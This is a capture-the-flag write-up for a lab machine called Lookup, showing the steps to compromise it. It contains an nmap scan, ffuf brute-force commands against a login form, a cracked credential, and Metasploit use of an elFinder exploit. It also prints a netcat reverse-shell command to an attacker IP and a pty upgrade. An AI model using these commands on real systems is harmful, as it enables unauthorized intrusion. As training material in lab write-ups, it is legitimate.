# Lookup

```
nmap -sCV 10.10.184.175
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 13:49 EST
Nmap scan report for lookup.thm (10.10.184.175)
Host is up (0.61s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:1c:32:19:40:69:9d:e1:49:a3:cc:64:50:82:33:bb (RSA)
|   256 a8:d1:be:74:90:f5:0d:d7:ed:5f:91:b3:e9:9b:1c:8d (ECDSA)
|_  256 cb:bf:af:22:58:27:53:a2:4a:25:6d:ff:d2:5a:05:b5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login Page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.54 seconds

```

----

> ### **``Edit /etc/host``**


<img width="1069" height="474" alt="image" src="https://github.com/user-attachments/assets/d8cde1e3-35cb-4d63-a26d-34c1a7aebebc" />

## fuzz on usernaem

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=REDACTED' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8
```

<img width="1138" height="544" alt="image" src="https://github.com/user-attachments/assets/b32c5eaf-a1ac-406e-9cc4-bbff6c9a2456" />



## fuzz on password

```
ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -ic -fs 62 -t 100
```

<img width="1128" height="546" alt="image" src="https://github.com/user-attachments/assets/b2f76e97-0f8a-47b6-a6fb-87e0c5a80468" />

```
jose : password123
```



<img width="1906" height="482" alt="image" src="https://github.com/user-attachments/assets/6d3770ca-e967-4e66-8fe5-6d0947e6dc09" />


## searchsploit `elfinder`

<img width="1203" height="543" alt="image" src="https://github.com/user-attachments/assets/2daa0ad7-93e0-457d-943e-6602456ca7ac" />


<img width="1144" height="256" alt="image" src="https://github.com/user-attachments/assets/12b6555a-4225-47a6-8da3-4558bed0c49e" />

## we will use metasploit

```
set rhosts files.lookup.thm
set lhost tun0
```

<img width="1098" height="520" alt="image" src="https://github.com/user-attachments/assets/f7e1f747-4f65-43e6-948e-c56c467d5799" />

<img width="987" height="111" alt="image" src="https://github.com/user-attachments/assets/e28c6f21-d552-42be-a749-80ae19366906" />

```
shell
busybox nc 10.8.47.102 9999 -e bash
```


<img width="950" height="441" alt="image" src="https://github.com/user-attachments/assets/08ac72d6-939e-4ca9-bb45-a37c9a3140c0" />

```
python3 -c 'import pty,os; pty.spawn("/bin/bash")'
```


----


## privesc









